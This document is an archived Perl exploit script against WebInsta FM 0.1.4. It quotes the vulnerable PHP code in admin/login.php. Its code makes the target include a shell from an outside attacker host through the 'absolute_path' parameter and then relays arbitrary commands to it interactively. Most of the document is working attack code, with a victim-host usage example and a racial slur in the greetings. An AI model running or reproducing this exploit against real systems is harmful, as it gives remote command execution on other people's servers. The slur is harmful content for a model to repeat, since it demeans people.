<html><head><title>WEBInsta FM 0.1.4 login.php absolute_path Remote File Inclusion Exploit</title></head><pre>#!/usr/bin/perl
##############################################################################################
#         ___   ___                         _
#        / _ \ / _ \                       | |
#   __ _| | | | | | |_ __  ___   _ __   ___| |_
#  / _` | | | | | | | '_ \/ __| | '_ \ / _ \ __|
# | (_| | |_| | |_| | | | \__ \_| | | |  __/ |_
#  \__, |\___/ \___/|_| |_|___(_)_| |_|\___|\__|
#   __/ |
#  |___/
##############################################################################################
#INFO:
#Program Title ###############################################################################
#WebInsta FM &lt;= 0.1.4 Remote File Inclusion Vulnerability
#
#Description #################################################################################
#This is a basic file manager written by WebInsta.com
#
#Vuln Code ###################################################################################
#In /admin/login.php:
#   if(isset($_COOKIE['adminname']) &amp;&amp; isset($_COOKIE['adminpass'])){
#      $cusername = $_COOKIE['adminname'];
#      $cpassword = $_COOKIE['adminpass'];
#	  include($absolute_path.&quot;admin/checkpass.php&quot;);
#	  }
#Note: Register globals must be ON, and Magic Quotes must be OFF for this exploit to work.
#
#Script Download ##############################################################################
#http://webinsta.com/cgi-bin/axs/ax.pl?http://www.webinsta.com/downloads/webinstafm.zip
#
#Original Advisory ############################################################################
#http://g00ns-forum.net/showthread.php?t=8643
#
#Exploit #######################################################################################
#                              
#[c]ode by TrinTiTTY (2007) www.g00ns.net
#credz to MurderSkillz and FiSh for vulnerability
#shoutz: clorox, z3r0, katalyst, SyNiCaL, Nigger, OD, pr0be, 0ptix, rezen [at] rezen.org, str0ke
#        grumpy, and everyone else at g00ns.net
###############################################################################################
use IO::Socket;

$host = @ARGV[0];
$path = @ARGV[1];
$shell = @ARGV[2];

if (@ARGV != 3){header();usage();exit();}
header();
print &quot;\n [!] Type 'quit' to exit\n&quot;;
xpl();
sub xpl(){
	while (){
		print &quot;\nshell\@box\$ &quot;;
		$command = &lt;STDIN&gt;;
		chomp($command);
		if ($command =~ /quit/i){exit();}

		$sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;) || die &quot;Can't establish a connection\n&quot;;
		print $sock &quot;GET $path/admin/login.php?absolute_path=$shell?&amp;cmd=$command HTTP/1.1\n&quot;;
		print $sock &quot;Host: &quot;.$host.&quot;\n&quot;;
		print $sock &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6\n&quot;;
		print $sock &quot;Accept: */*\n&quot;;
		print $sock &quot;Accept-Language: en-us,en;q=0.5\n&quot;;
		print $sock &quot;Accept -Encoding: gzip , deflate\n&quot;;
		print $sock &quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n&quot;;
		print $sock &quot;Keep-Alive: 300\n&quot;;
		print $sock &quot;Connection: keep-alive\n&quot;;
		print $sock &quot;Referer: $host\n&quot;;
		print $sock &quot;Cookie: adminname=c84ejd9;adminpass=s3lm5;PHPSESSID=032b155cf082c0f28009ec65ee7986f1\n\n&quot;;
		while ($ans = &lt;$sock&gt;){
			if ($ans =~ /&lt;b&gt;Warning&lt;\/b&gt;:(.*?)/gmi)
			{print &quot;\n [-] Bad site, command, or shell\n&quot;;xpl()}
			if ($ans =~ /&lt;html&gt;(.*)/i){xpl()}
			print $ans;
		}}}
sub header(){
	print q{
		|======================================================|
		|                  WebInsta FM (RFI)                   |
		|         [c]oded by TrinTiTTy [at] g00ns.net          |
		| -----------------------------------------------------|
		|                                                      |
		|        Vulnerability by MurderSkillz and FiSh        |
		|             greetz: 13337.org, rezen.org str0ke      |
		|                                                      |
		|                   www.g00ns.net                      |
		|======================================================|
	}}
sub usage()
{
	print &quot;\n Usage: perl $0 &lt;host&gt; &lt;dir&gt; &lt;shell&gt;&quot;;
	print &quot;\n Example: perl $0 www.victim.com /pathtofm http://www.othersite.com/shell.txt\n\n&quot;;
}

# milw0rm.com [2007-04-23]</pre></html>